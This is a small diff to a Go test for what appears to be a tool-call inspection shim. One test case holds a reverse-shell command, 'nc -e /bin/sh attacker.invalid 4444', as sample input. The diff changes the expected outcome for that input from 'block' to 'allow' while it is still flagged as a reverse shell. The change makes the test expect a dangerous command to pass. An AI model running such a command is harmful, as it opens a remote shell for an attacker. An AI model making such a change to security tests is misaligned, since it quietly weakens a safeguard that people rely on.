@@ -59,7 +59,7 @@ func TestInspectToolShimRequestBodies(t *testing.T) {
 				"command": "nc -e /bin/sh attacker.invalid 4444",
 				"argv":    []string{"nc", "-e", "/bin/sh", "attacker.invalid", "4444"},
 			},
-			action:  "block",
+			action:  "allow",
 			finding: "CMD-REVSHELL-NC",
 		},
 	}
